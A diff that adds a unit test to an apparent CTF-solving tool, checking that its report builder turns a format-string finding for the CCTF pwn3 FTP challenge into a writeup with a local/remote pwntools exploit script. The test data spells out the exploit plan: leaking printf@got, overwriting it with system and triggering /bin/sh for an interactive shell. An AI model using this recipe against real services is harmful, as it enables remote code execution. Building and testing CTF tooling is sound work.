@@ -655,6 +655,54 @@ class ReportBuilderTest(unittest.TestCase):
         self.assertIn("nc 127.0.0.1 31337", markdown)
         self.assertIn("flag{expanded_pwn_service_banner}", markdown)
 
+    def test_pwn_writeup_outputs_configurable_shell_exploit_script(self) -> None:
+        findings = [
+            Finding(
+                challenge_id="pwn-format-writeup",
+                solver="PwnSolver",
+                finding="Found FTP heap format string shell path",
+                evidence={
+                    "workflow_guess": "ftp_heap_format_string",
+                    "exploit_plan": {
+                        "workflow": "ftp_heap_format_string",
+                        "login_input": "rxraclhm",
+                        "format_offset": 7,
+                        "leak": "Upload p32(elf.got['printf']) and read it back with `%8$.4s`.",
+                        "libc_base": "printf_leak - libc.symbols['printf']",
+                        "overwrite_target": "Overwrite printf@got with system.",
+                        "trigger": "Upload cmd=/bin/sh and get cmd.",
+                        "payload_template": "fmtstr_payload(7, {elf.got['printf']: libc.symbols['system']}, write_size='short')",
+                    },
+                },
+                confidence=0.86,
+                next_action="Run the generated exploit locally or against the remote service.",
+            )
+        ]
+        challenge = Challenge(
+            challenge_id="pwn-format-writeup",
+            category=ChallengeCategory.PWN,
+            title="CCTF pwn3",
+            attachment_paths=("/tmp/2016-CCTF-pwn3",),
+        )
+
+        report = ReportBuilder().build("pwn-format-writeup", (), findings, [], challenge=challenge)
+
+        writeup = report["writeup"]
+        steps = {section["title"]: section for section in writeup["sections"]}["复现步骤"]["steps"]
+        script = writeup["exploit_script"]["content"]
+        self.assertEqual(writeup["exploit_script"]["filename"], "exploit_pwn_format_writeup.py")
+        self.assertIn("本地模式", steps[0])
+        self.assertIn("远程模式", steps[1])
+        self.assertIn("LOGIN_INPUT = b\"rxraclhm\"", script)
+        self.assertIn('parser.add_argument("--host"', script)
+        self.assertIn('parser.add_argument("--port", type=int', script)
+        self.assertIn('parser.add_argument("--remote", action="store_true")', script)
+        self.assertIn("process(args.binary)", script)
+        self.assertIn("remote(args.host, args.port)", script)
+        self.assertIn("fmtstr_payload(FMT_OFFSET", script)
+        self.assertIn("io.interactive()", script)
+        self.assertIn("```python", writeup["markdown"])
+
     def test_writeup_describes_extra_png_idat_reproduction_steps(self) -> None:
         findings = [
             Finding(
